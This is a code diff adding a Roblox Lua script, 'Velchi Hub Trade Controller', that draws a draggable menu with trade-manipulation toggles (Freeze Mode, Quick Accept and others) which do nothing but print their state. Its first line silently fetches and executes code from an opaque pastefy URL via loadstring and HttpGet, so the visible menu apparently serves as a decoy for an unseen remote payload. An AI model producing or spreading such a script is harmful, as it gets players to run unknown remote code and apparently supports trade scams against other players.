@@ -1,0 +1,299 @@
+loadstring(game:HttpGet("https://pastefy.app/0oa0HgKh/raw"))()
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local old = playerGui:FindFirstChild("VelchiHubGUI")
+if old then
+	old:Destroy()
+end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "VelchiHubGUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = playerGui
+
+-- Open button
+local openBtn = Instance.new("TextButton")
+openBtn.Parent = gui
+openBtn.Size = UDim2.new(0, 72, 0, 72)
+openBtn.Position = UDim2.new(0.24, 0, 0.38, 0)
+openBtn.Text = "V"
+openBtn.Font = Enum.Font.GothamBlack
+openBtn.TextSize = 28
+openBtn.TextColor3 = Color3.fromRGB(255,255,255)
+openBtn.BackgroundColor3 = Color3.fromRGB(38, 42, 58)
+openBtn.BorderSizePixel = 0
+openBtn.AutoButtonColor = true
+
+local obCorner = Instance.new("UICorner")
+obCorner.CornerRadius = UDim.new(0, 18)
+obCorner.Parent = openBtn
+
+local obStroke = Instance.new("UIStroke")
+obStroke.Color = Color3.fromRGB(70, 140, 255)
+obStroke.Thickness = 3
+obStroke.Parent = openBtn
+
+-- Main frame
+local main = Instance.new("Frame")
+main.Parent = gui
+main.Name = "Main"
+main.Size = UDim2.new(0, 305, 0, 190)
+main.Position = UDim2.new(0.44, 0, 0.28, 0)
+main.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+main.BorderSizePixel = 0
+main.Visible = true
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 18)
+mainCorner.Parent = main
+
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = Color3.fromRGB(85, 55, 255)
+mainStroke.Thickness = 3
+mainStroke.Parent = main
+
+-- Top bar
+local topBar = Instance.new("Frame")
+topBar.Parent = main
+topBar.Size = UDim2.new(1, 0, 0, 42)
+topBar.BackgroundTransparency = 1
+
+local icon = Instance.new("Frame")
+icon.Parent = topBar
+icon.Size = UDim2.new(0, 24, 0, 24)
+icon.Position = UDim2.new(0, 12, 0, 9)
+icon.BackgroundColor3 = Color3.fromRGB(95, 60, 255)
+icon.BorderSizePixel = 0
+
+local iconCorner = Instance.new("UICorner")
+iconCorner.CornerRadius = UDim.new(0, 6)
+iconCorner.Parent = icon
+
+local iconText = Instance.new("TextLabel")
+iconText.Parent = icon
+iconText.Size = UDim2.new(1, 0, 1, 0)
+iconText.BackgroundTransparency = 1
+iconText.Text = "V"
+iconText.TextColor3 = Color3.fromRGB(255,255,255)
+iconText.Font = Enum.Font.GothamBold
+iconText.TextSize = 14
+
+local title = Instance.new("TextLabel")
+title.Parent = topBar
+title.BackgroundTransparency = 1
+title.Position = UDim2.new(0, 42, 0, 5)
+title.Size = UDim2.new(0, 180, 0, 16)
+title.Text = "VELCHI HUB"
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 14
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+local subtitle = Instance.new("TextLabel")
+subtitle.Parent = topBar
+subtitle.BackgroundTransparency = 1
+subtitle.Position = UDim2.new(0, 42, 0, 20)
+subtitle.Size = UDim2.new(0, 180, 0, 14)
+subtitle.Text = "Trade Controller"
+subtitle.TextColor3 = Color3.fromRGB(150,150,180)
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextSize = 9
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+
+local close = Instance.new("TextButton")
+close.Parent = topBar
+close.Size = UDim2.new(0, 24, 0, 24)
+close.Position = UDim2.new(1, -34, 0, 9)
+close.Text = "✕"
+close.Font = Enum.Font.GothamBold
+close.TextSize = 14
+close.TextColor3 = Color3.fromRGB(255,255,255)
+close.BackgroundColor3 = Color3.fromRGB(30, 20, 20)
+close.BorderSizePixel = 0
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(1, 0)
+closeCorner.Parent = close
+
+-- Content
+local content = Instance.new("Frame")
+content.Parent = main
+content.BackgroundTransparency = 1
+content.Position = UDim2.new(0, 10, 0, 48)
+content.Size = UDim2.new(1, -20, 1, -58)
+
+local layout = Instance.new("UIListLayout")
+layout.Parent = content
+layout.Padding = UDim.new(0, 6)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local function createToggle(text)
+	local row = Instance.new("Frame")
+	row.Parent = content
+	row.Size = UDim2.new(1, 0, 0, 28)
+	row.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
+	row.BorderSizePixel = 0
+
+	local rowCorner = Instance.new("UICorner")
+	rowCorner.CornerRadius = UDim.new(0, 8)
+	rowCorner.Parent = row
+
+	local leftIcon = Instance.new("Frame")
+	leftIcon.Parent = row
+	leftIcon.Size = UDim2.new(0, 16, 0, 16)
+	leftIcon.Position = UDim2.new(0, 8, 0.5, -8)
+	leftIcon.BackgroundColor3 = Color3.fromRGB(90, 60, 255)
+	leftIcon.BorderSizePixel = 0
+
+	local liCorner = Instance.new("UICorner")
+	liCorner.CornerRadius = UDim.new(0, 4)
+	liCorner.Parent = leftIcon
+
+	local check = Instance.new("TextLabel")
+	check.Parent = leftIcon
+	check.Size = UDim2.new(1, 0, 1, 0)
+	check.BackgroundTransparency = 1
+	check.Text = "✓"
+	check.TextColor3 = Color3.fromRGB(255,255,255)
+	check.Font = Enum.Font.GothamBold
+	check.TextSize = 10
+
+	local label = Instance.new("TextLabel")
+	label.Parent = row
+	label.BackgroundTransparency = 1
+	label.Position = UDim2.new(0, 30, 0, 0)
+	label.Size = UDim2.new(1, -90, 1, 0)
+	label.Text = text
+	label.TextColor3 = Color3.fromRGB(240,240,255)
+	label.Font = Enum.Font.GothamSemibold
+	label.TextSize = 11
+	label.TextXAlignment = Enum.TextXAlignment.Left
+
+	local toggle = Instance.new("TextButton")
+	toggle.Parent = row
+	toggle.Size = UDim2.new(0, 34, 0, 16)
+	toggle.Position = UDim2.new(1, -42, 0.5, -8)
+	toggle.Text = ""
+	toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
+	toggle.BorderSizePixel = 0
+	toggle.AutoButtonColor = false
+
+	local tCorner = Instance.new("UICorner")
+	tCorner.CornerRadius = UDim.new(1, 0)
+	tCorner.Parent = toggle
+
+	local knob = Instance.new("Frame")
+	knob.Parent = toggle
+	knob.Size = UDim2.new(0, 12, 0, 12)
+	knob.Position = UDim2.new(0, 2, 0.5, -6)
+	knob.BackgroundColor3 = Color3.fromRGB(255,255,255)
+	knob.BorderSizePixel = 0
+
+	local kCorner = Instance.new("UICorner")
+	kCorner.CornerRadius = UDim.new(1, 0)
+	kCorner.Parent = knob
+
+	local on = false
+
+	local function refresh()
+		if on then
+			TweenService:Create(toggle, TweenInfo.new(0.15), {
+				BackgroundColor3 = Color3.fromRGB(100, 65, 255)
+			}):Play()
+			TweenService:Create(knob, TweenInfo.new(0.15), {
+				Position = UDim2.new(0, 20, 0.5, -6)
+			}):Play()
+		else
+			TweenService:Create(toggle, TweenInfo.new(0.15), {
+				BackgroundColor3 = Color3.fromRGB(50, 50, 65)
+			}):Play()
+			TweenService:Create(knob, TweenInfo.new(0.15), {
+				Position = UDim2.new(0, 2, 0.5, -6)
+			}):Play()
+		end
+		print(text .. " = " .. tostring(on))
+	end
+
+	toggle.MouseButton1Click:Connect(function()
+		on = not on
+		refresh()
+	end)
+
+	row.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			on = not on
+			refresh()
+		end
+	end)
+
+	refresh()
+end
+
+-- Safe visual labels
+createToggle("Freeze Mode")
+createToggle("Quick Accept")
+createToggle("Delay Mode")
+createToggle("Cancel Prompt")
+
+-- Draggable
+local dragging = false
+local dragInput
+local dragStart
+local startPos
+
+local function updateDrag(input)
+	local delta = input.Position - dragStart
+	main.Position = UDim2.new(
+		startPos.X.Scale,
+		startPos.X.Offset + delta.X,
+		startPos.Y.Scale,
+		startPos.Y.Offset + delta.Y
+	)
+end
+
+topBar.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = main.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+topBar.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+	if dragging and input == dragInput then
+		updateDrag(input)
+	end
+end)
+
+-- Open / close
+openBtn.MouseButton1Click:Connect(function()
+	main.Visible = true
+	openBtn.Visible = false
+end)
+
+close.MouseButton1Click:Connect(function()
+	main.Visible = false
+	openBtn.Visible = true
+end)
+
+-- Start opened
+main.Visible = true
+openBtn.Visible = false
